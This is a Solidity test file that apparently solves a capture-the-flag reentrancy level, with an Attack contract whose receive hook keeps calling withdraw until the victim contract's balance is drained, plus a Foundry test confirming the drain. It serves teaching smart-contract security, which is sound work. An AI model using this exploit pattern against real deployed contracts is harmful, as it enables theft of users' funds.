// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ReEntrancy.sol";

/// @custom:win-condition 
// The goal of this level is for you to steal all the funds from the contract.

/// @custom:lesson-learned
// state updates should happen before any calls are made

contract Attack {

  ReEntrancy public s_victim;
    
  constructor(ReEntrancy _victim) payable {
    s_victim = _victim;
  }

  function attack() external {
      s_victim.donate{value: 1 ether}(address(this));
      s_victim.withdraw(1 ether);
  }

  receive() external payable {
      uint amount = min(1e18, address(s_victim).balance);
      if (amount > 0) {
        s_victim.withdraw(amount);
      } 
  }

  function min(uint x, uint y) private pure returns (uint) {
    return x <= y ? x : y;
  }
}


contract ReEntrancySolvedTest is Test {

  ReEntrancy public s_reEntrancy;
  address payable s_user;

  function setUp() public {
    s_reEntrancy = new ReEntrancy{value: 20 ether}();
    s_user = payable(vm.addr(1));
    vm.deal(s_user, 100000000 ether);
  }

  function testWinCondition() public {

    vm.prank(s_user);
    Attack attack = new Attack{value: 5 ether}(s_reEntrancy);

    attack.attack();

    assertEq(address(s_reEntrancy).balance, 0);
  }
 
}